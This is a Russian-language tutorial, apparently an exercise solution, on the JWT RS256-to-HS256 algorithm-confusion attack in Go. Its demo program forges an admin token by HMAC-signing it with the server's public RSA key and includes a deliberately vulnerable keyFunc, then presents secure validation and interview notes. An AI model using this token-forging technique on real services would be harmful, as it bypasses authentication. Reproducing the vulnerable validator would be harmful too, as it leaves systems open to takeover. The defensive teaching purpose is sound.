# Алгоритмическая путаница: атака RS256 против HS256

## Условие

Покажите атаку: сервер проверяет RS256, но атакующий подписывает JWT симметричным HMAC с использованием публичного RSA-ключа как секрета. Напишите защиту: раздельные ключи для симметричных и асимметричных подписей и проверка типа ключа.

### Исходная формулировка

**Алгоритмическая путаница (RS256 vs HS256).**: Покажите атаку: сервер проверяет RS256, но атакующий подписывает JWT симметричным HMAC с использованием публичного RSA-ключа как секрета. Напишите защиту: раздельные ключи для симметричных и асимметричных алгоритмов.

## Теория

**Algorithm Confusion Attack (Путаница алгоритмов / Key Confusion)** — одна из классических критических уязвимостей архитектуры JWT.

### Механика атаки:
1. Сервер использует асимметричную подпись **RS256**:
   - Приватный RSA-ключ хранится в секрете на сервере и подписывает токены.
   - Публичный RSA-ключ общеизвестен (опубликован на сайте или в JWKS для проверки подписи микросервисами).
2. Атакующий берет публичный ключ RSA сервера (например, строку PEM `-----BEGIN PUBLIC KEY-----...`).
3. Атакующий подделывает полезную нагрузку (делает себя `admin`) и меняет в заголовке алгоритм на **`"alg": "HS256"`** (симметричный HMAC).
4. Атакующий подписывает токен алгоритмом HMAC-SHA256, используя в качестве **симметричного секрета публичный ключ RSA сервера**!
5. **Уязвимость на сервере:**
   ```go
   jwt.Parse(tokenStr, func(token *jwt.Token) (any, error) {
       // Сервер слепо возвращает rsaPublicKey, думая, что проверяется RS256!
       return rsaPublicKey, nil
   })
   ```
6. Библиотека JWT видит в заголовке `alg: "HS256"`. Она берет переданный сервером публичный ключ и выполняет проверку HMAC-SHA256 с этим ключом как секретом. Проверка сходится, и злоумышленник получает полный доступ!

### Защита:
Внутри функции `keyFunc` **обязательно** проверять тип реального метода подписи (`token.Method`):
```go
if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
    return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
}
```

## Решение по шагам

1. Сгенерируем RSA пару ключей (Private и Public).
2. Реализуем уязвимый серверный валидатор `VulnerableKeyFunc`, возвращающий публичный ключ без проверки метода.
3. Сымитируем атакующего: сформируем токен с `alg: "HS256"`, подписанный HMAC-SHA256 с публичным RSA-ключом.
4. Продемонстрируем успешный несанкционированный вход атакующего.
5. Реализуем защищенный валидатор `SecureKeyFunc`, проверяющий `token.Method.(*jwt.SigningMethodRSA)` и бескомпромиссно пресекающий атаку.

## Код решения

**`main.go`**

```go
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"time"

	"github.com/golang-jwt/jwt/v5"
)

func main() {
	// 1. Сервер генерирует пару ключей RSA для RS256
	rsaPrivateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		panic(err)
	}
	rsaPublicKey := &rsaPrivateKey.PublicKey

	// Публичный ключ экспортируется в PEM (он публично доступен всем!)
	pubASN1, _ := x509.MarshalPKIXPublicKey(rsaPublicKey)
	pubPEMBytes := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: pubASN1})

	// 2. Атакующий знает публичный ключ сервера!
	// Он создает поддельный токен с алгоритмом HS256, используя публичный ключ как секрет HMAC!
	attackClaims := jwt.MapClaims{
		"sub":   "attacker_hacker",
		"role":  "superadmin",
		"exp":   time.Now().Add(1 * time.Hour).Unix(),
		"admin": true,
	}

	attackTokenObj := jwt.NewWithClaims(jwt.SigningMethodHS256, attackClaims)
	// Атакующий подписывает HMAC-ом, передавая PEM публичного ключа как секрет:
	attackTokenStr, err := attackTokenObj.SignedString(pubPEMBytes)
	if err != nil {
		panic(err)
	}

	fmt.Println("=== 1. Поддельный токен атаки (Algorithm Confusion RS256 -> HS256) ===")
	fmt.Printf("Attack Token: %s...\n\n", attackTokenStr[:45])

	// 3. Сервер с уязвимой реализацией KeyFunc:
	vulnerableKeyFunc := func(token *jwt.Token) (any, error) {
		// ОШИБКА: Сервер слепо возвращает байты публичного ключа,
		// доверяя заголовку токена! Если алгоритм HS256, библиотека
		// воспримет pubPEMBytes как HMAC секрет!
		return pubPEMBytes, nil
	}

	vulnToken, vulnErr := jwt.Parse(attackTokenStr, vulnerableKeyFunc)
	if vulnErr == nil && vulnToken.Valid {
		fmt.Println("🚨 КРИТИЧЕСКАЯ УЯЗВИМОСТЬ:")
		fmt.Println("Сервер успешно верифицировал поддельный токен атакующего как HS256!")
		fmt.Printf("Claims: %v\n\n", vulnToken.Claims)
	}

	// 4. Защищенная реализация KeyFunc
	secureKeyFunc := func(token *jwt.Token) (any, error) {
		// ЗАЩИТА 1: Строго проверяем, что алгоритм принадлежит семейству RSA!
		if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
			return nil, fmt.Errorf("security alert: unexpected signing method: %v", token.Header["alg"])
		}
		// ЗАЩИТА 2: Возвращаем строго типизированный *rsa.PublicKey, а не []byte!
		return rsaPublicKey, nil
	}

	fmt.Println("=== 2. Проверка через SecureKeyFunc ===")
	_, secErr := jwt.Parse(attackTokenStr, secureKeyFunc, jwt.WithValidMethods([]string{"RS256"}))
	if secErr != nil {
		fmt.Printf("🛡️ АТАКА ПРЕДОТВРАЩЕНА: %v\n", secErr)
	} else {
		fmt.Println("Ошибка: токен прошел проверку!")
	}
}
```

## Под капотом

Внутри `golang-jwt` метод `SigningMethodHMAC.Verify` ожидает в качестве ключа тип `[]byte`. Если `keyFunc` возвращает `[]byte(pubPEMBytes)`, HMAC успешно использует публичный PEM-ключ как симметричный пароль.
Метод `SigningMethodRSA.Verify` ожидает тип `*rsa.PublicKey`. Если `keyFunc` возвращает строго `*rsa.PublicKey`, а заголовок подменен на `HS256`, библиотека не сможет преобразовать `*rsa.PublicKey` в срез байт для HMAC и выбросит ошибку типа.

## Подводные камни

1. **Возврат `[]byte` вместо конкретных структур ключей:** Возврат сырого среза `[]byte` из `keyFunc` стирает информацию о типе ключа, открывая возможность для подмены HMAC. Всегда возвращайте `*rsa.PublicKey`, `*ecdsa.PublicKey` или `ed25519.PublicKey`.
2. **Игнорирование проверки интерфейса:** Никогда не полагайтесь на то, что «клиенты присылают правильные токены».
3. **Отсутствие опции `jwt.WithValidMethods`:** Всегда передавайте список ожидаемых методов в `jwt.Parse`.

## На собеседовании

**Вопрос с собеседования в Касперский/Яндекс:** «Объясните суть атаки Key Confusion (RS256 против HS256) в JWT и приведите два правила безопасного кода для ее полного предотвращения в Go.»
**Ответ:** Суть атаки: если сервер ожидает токены RS256 (асимметричная подпись), его публичный ключ RSA открыт миру. Злоумышленник формирует токен с заголовком `"alg":"HS256"` (симметричный HMAC) и подписывает его алгоритмом HMAC-SHA256, используя публичный ключ RSA сервера как секретный пароль. Если сервер не проверяет совпадение типа алгоритма, библиотека проверяет HMAC с публичным ключом, и подпись совпадает.
Два правила предотвращения в Go:
1. Использовать `jwt.WithValidMethods([]string{"RS256"})` для отсечения любых не-RSA алгоритмов до вызова функции поиска ключа.
2. В функции `keyFunc` выполнять строгую проверку типа метода: `if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok { return nil, err }` и возвращать типизированный `*rsa.PublicKey`, а не сырой срез байт `[]byte`.
